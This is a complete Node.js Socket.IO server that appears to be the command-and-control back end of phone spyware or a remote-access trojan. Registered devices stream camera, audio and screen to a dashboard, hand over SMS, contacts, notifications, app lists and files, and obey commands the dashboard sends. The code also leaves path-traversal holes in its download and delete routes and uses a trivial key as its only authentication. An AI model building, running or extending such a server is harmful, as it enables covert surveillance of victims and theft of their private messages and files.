const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: '*' },
    maxHttpBufferSize: 1e8,
    pingTimeout: 60000
});

const PORT = 6661;
const DEVICES_DIR = path.join(__dirname, 'devices');
const PUBLIC_DIR = path.join(__dirname, 'public');

fs.ensureDirSync(DEVICES_DIR);
fs.ensureDirSync(PUBLIC_DIR);

app.use(express.json({ limit: '200mb' }));
app.use(express.static(PUBLIC_DIR));

app.get('/', (req, res) => {
    const f = path.join(PUBLIC_DIR, 'dashboard.html');
    if (fs.existsSync(f)) {
        res.sendFile(f);
    } else {
        res.status(500).send('ERROR: public/dashboard.html not found! Path: ' + f);
    }
});

app.get('/download/:key/:dev/:type/:file', (req, res) => {
    const p = path.join(DEVICES_DIR, req.params.key, req.params.dev,
        req.params.type, req.params.file);
    fs.existsSync(p) ? res.download(p) : res.status(404).send('Not found');
});

app.get('/recordings/:key/:dev/:type', (req, res) => {
    const dir = path.join(DEVICES_DIR, req.params.key, req.params.dev, req.params.type);
    fs.ensureDirSync(dir);
    try {
        const files = fs.readdirSync(dir).filter(f => !f.startsWith('.')).map(fn => {
            const fp = path.join(dir, fn);
            const st = fs.statSync(fp);
            return { filename: fn, size: st.size, created: st.birthtime,
                url: `/download/${req.params.key}/${req.params.dev}/${req.params.type}/${fn}` };
        }).sort((a, b) => new Date(b.created) - new Date(a.created));
        res.json(files);
    } catch(e) { res.json([]); }
});

app.delete('/recording/:key/:dev/:type/:file', (req, res) => {
    const p = path.join(DEVICES_DIR, req.params.key, req.params.dev,
        req.params.type, req.params.file);
    try { fs.removeSync(p); res.json({ success: true }); }
    catch(e) { res.status(500).json({ error: e.message }); }
});

// Data stores
const keyDevs = new Map();
const keyDash = new Map();
const sockMeta = new Map();
const devInfo = new Map();
const chunks = new Map();

const devs = k => { if (!keyDevs.has(k)) keyDevs.set(k, new Map()); return keyDevs.get(k); };
const dash = k => { if (!keyDash.has(k)) keyDash.set(k, new Set()); return keyDash.get(k); };
const bcast = (k, ev, d) => dash(k).forEach(s => s.emit(ev, d));
const todev = (k, dn, ev, d) => dash(k).forEach(s => { if (s.curDev === dn) s.emit(ev, d); });

io.on('connection', socket => {
    console.log('Connect:', socket.id);

    socket.on('register', data => {
        const { deviceName: dn, key } = data;
        if (!dn || !key) return;
        socket.dkey = key; socket.dname = dn; socket.isDevice = true;
        sockMeta.set(socket.id, { key, dn, isDevice: true });
        devs(key).set(dn, socket);
        ['Camera','Audio','Screen','Files'].forEach(t =>
            fs.ensureDirSync(path.join(DEVICES_DIR, key, dn, t)));
        console.log('Device:', key, dn);
        bcast(key, 'device_connected', { deviceName: dn, info: data });
    });

    socket.on('dashboard_auth', (data, cb) => {
        const key = (data.key || '').trim();
        if (!key) return cb({ success: false, error: 'Empty key' });
        socket.isDash = true; socket.dkey = key;
        sockMeta.set(socket.id, { key, isDash: true });
        dash(key).add(socket);
        const online = [];
        devs(key).forEach((s, dn) => {
            if (s.connected) online.push({ deviceName: dn,
                info: devInfo.get(key+':'+dn) || {} });
        });
        console.log('Dashboard:', key, online.length, 'devices');
        cb({ success: true, devices: online });
    });

    socket.on('send_command', ({ deviceName: dn, command }) => {
        if (!socket.isDash) return;
        const s = devs(socket.dkey).get(dn);
        if (s && s.connected) s.emit('command', command);
    });

    socket.on('set_current_device', d => { socket.curDev = d.deviceName; });
    socket.on('watch_camera', d => { socket.wCam = d.deviceName; });
    socket.on('watch_audio', d => { socket.wAud = d.deviceName; });
    socket.on('watch_screen', d => { socket.wScr = d.deviceName; });
    socket.on('stop_watch_camera', () => { socket.wCam = null; });
    socket.on('stop_watch_audio', () => { socket.wAud = null; });
    socket.on('stop_watch_screen', () => { socket.wScr = null; });

    socket.on('device_info', d => {
        if (!socket.isDevice) return;
        devInfo.set(socket.dkey+':'+d.deviceName, d);
        bcast(socket.dkey, 'device_info_update', d);
    });

    socket.on('camera_frame', d => {
        if (!socket.isDevice) return;
        dash(socket.dkey).forEach(s => { if (s.wCam === d.deviceName) s.emit('camera_frame', d); });
    });

    socket.on('audio_chunk', d => {
        if (!socket.isDevice) return;
        dash(socket.dkey).forEach(s => { if (s.wAud === d.deviceName) s.emit('audio_chunk', d); });
    });

    socket.on('screen_frame', d => {
        if (!socket.isDevice) return;
        dash(socket.dkey).forEach(s => { if (s.wScr === d.deviceName) s.emit('screen_frame', d); });
    });

    socket.on('image_preview', d => {
        if (!socket.isDevice) return;
        todev(socket.dkey, d.deviceName, 'image_preview', d);
    });

    socket.on('messages_data', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'messages_data', d); });
    socket.on('new_sms', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'new_sms', d); });
    socket.on('sms_sent', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'sms_sent', d); });
    socket.on('contacts_data', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'contacts_data', d); });
    socket.on('files_data', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'files_data', d); });
    socket.on('apps_data', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'apps_data', d); });
    socket.on('notification', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'notification', d); });
    socket.on('file_deleted', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'file_deleted', d); });
    socket.on('file_uploaded', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'file_uploaded', d); });
    socket.on('recording_saved', d => { if (!socket.isDevice) return; todev(socket.dkey, d.deviceName, 'recording_saved', d); });

    socket.on('contacts_download', async d => {
        if (!socket.isDevice) return;
        try {
            const fp = path.join(DEVICES_DIR, socket.dkey, d.deviceName, 'Files', d.filename);
            await fs.writeFile(fp, Buffer.from(d.data, 'base64'));
            todev(socket.dkey, d.deviceName, 'contacts_download_ready',
                { url: `/download/${socket.dkey}/${d.deviceName}/Files/${d.filename}`, filename: d.filename });
        } catch(e) { console.error(e); }
    });

    socket.on('file_download_chunk', d => {
        if (!socket.isDevice) return;
        const k = `${socket.dkey}:${d.deviceName}:${d.filename}`;
        if (!chunks.has(k)) chunks.set(k, []);
        chunks.get(k).push(Buffer.from(d.data, 'base64'));
        todev(socket.dkey, d.deviceName, 'file_download_progress',
            { filename: d.filename, chunk: d.chunk, totalChunks: d.totalChunks,
              progress: Math.round((d.chunk+1)/d.totalChunks*100) });
    });

    socket.on('file_download_done', async d => {
        if (!socket.isDevice) return;
        const k = `${socket.dkey}:${d.deviceName}:${d.filename}`;
        const buf = Buffer.concat(chunks.get(k) || []);
        chunks.delete(k);
        const fp = path.join(DEVICES_DIR, socket.dkey, d.deviceName, 'Files', d.filename);
        await fs.writeFile(fp, buf);
        todev(socket.dkey, d.deviceName, 'file_ready',
            { filename: d.filename, url: `/download/${socket.dkey}/${d.deviceName}/Files/${d.filename}` });
    });

    socket.on('disconnect', () => {
        const m = sockMeta.get(socket.id);
        if (!m) return;
        if (m.isDevice) {
            devs(m.key).delete(m.dn);
            devInfo.delete(m.key+':'+m.dn);
            bcast(m.key, 'device_disconnected', { deviceName: m.dn });
            console.log('Device left:', m.key, m.dn);
        }
        if (m.isDash) { dash(m.key).delete(socket); }
        sockMeta.delete(socket.id);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log('=================================');
    console.log('Server running on port ' + PORT);
    console.log('Dashboard: http://localhost:' + PORT);
    console.log('Public dir: ' + PUBLIC_DIR);
    console.log('=================================');
});
